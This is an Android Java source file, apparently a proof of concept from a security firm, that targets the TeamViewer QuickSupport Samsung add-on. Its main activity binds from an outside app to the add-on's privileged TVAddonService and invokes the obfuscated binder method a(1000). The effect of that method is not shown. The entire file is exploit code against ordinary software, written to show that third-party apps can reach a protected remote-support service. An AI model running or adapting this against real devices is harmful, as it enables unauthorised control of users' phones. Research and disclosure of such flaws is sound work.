package com.nowsecure.twpoc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

import com.teamviewer.incomingrcsharedlib.communication.IAddonService;


public class MainActivity extends Activity implements ServiceConnection {

    private static final String TAG = "TWPOC";

    private IAddonService binderObject;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // binding to the teamviewer service (hopefully)
        Intent i = new Intent();
        i.setComponent(new ComponentName("com.teamviewer.quicksupport.addon.samsung",
                "com.teamviewer.incomingrcaddonlib.TVAddonService"));
        bindService(i, this, Context.BIND_AUTO_CREATE);
    }


    @Override
    public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
        Log.d(TAG, "onServiceConnected " + componentName + " " + iBinder);

        try {
            Log.d(TAG, iBinder.getInterfaceDescriptor());
            binderObject = (IAddonService) iBinder;
            binderObject.a(1000);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onServiceDisconnected(ComponentName componentName) {
        Log.d(TAG, "onServiceDisconnected " + componentName);
        binderObject = null;
    }
}
